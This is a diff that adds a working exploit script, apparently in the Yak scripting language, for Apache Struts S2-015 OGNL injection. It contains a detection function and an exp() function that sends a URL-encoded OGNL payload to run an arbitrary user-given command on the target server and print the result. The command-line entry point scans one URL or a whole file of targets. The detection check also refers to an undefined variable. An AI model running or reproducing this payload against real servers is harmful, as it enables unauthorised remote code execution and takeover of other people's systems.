@@ -1,0 +1,80 @@
+
+def poc(url){
+    num1 = randn(10000,100000)
+    num2 = randn(10000,100000)
+
+    data = str.Split(url /*type: string*/, "/" /*type: string*/)
+    
+    url = str.Join(data[:len(data)-1]/*type: []string*/, "/" /*type: string*/) + "/"
+
+    echo_data = "echo " + randstr(8)
+
+    payload =  `%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('`+ echo_data +`').getInputStream())%2C%23q%7D`
+
+    req, err = http.Get(
+            url+payload + ".action",
+            http.useragent(http.uarand()),
+            )
+    if err != nil {
+        return
+    }
+
+    rsp_data = http.GetAllBody(req)
+    if re.Match(random_str,rsp_data){
+        log.warn(url + " S2_015 found !!!")
+    }else{
+        log.debug(url + " S2_015 safe !!!")
+    }
+}
+
+
+def  exp(url,cmd){
+    data = str.Split(url /*type: string*/, "/" /*type: string*/)
+    
+    url = str.Join(data[:len(data)-1]/*type: []string*/, "/" /*type: string*/) + "/"
+
+    payload =  `%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('`+ cmd +`').getInputStream())%2C%23q%7D`
+
+   
+
+    req, err = http.Get(
+            url+payload + ".action",
+            http.useragent(http.uarand()),
+            )
+    if err != nil {
+        return
+    }
+    rsp_data = http.GetAllBody(req)
+    println(string(rsp_data))
+}
+
+
+if YAK_MAIN {
+    loglevel("info")
+    u = cli.String("u")
+    file = cli.LineDict("f")
+    cmd = cli.String("cmd")
+
+    if u == "" && len(file)<1 {
+        log.info("you need input target -u or -f")
+        return
+    }
+
+    if u != ""{
+        if cmd != ""{
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+        return
+    }
+
+    for _,u = range file {
+         if cmd != "" {
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+    }
+
+}
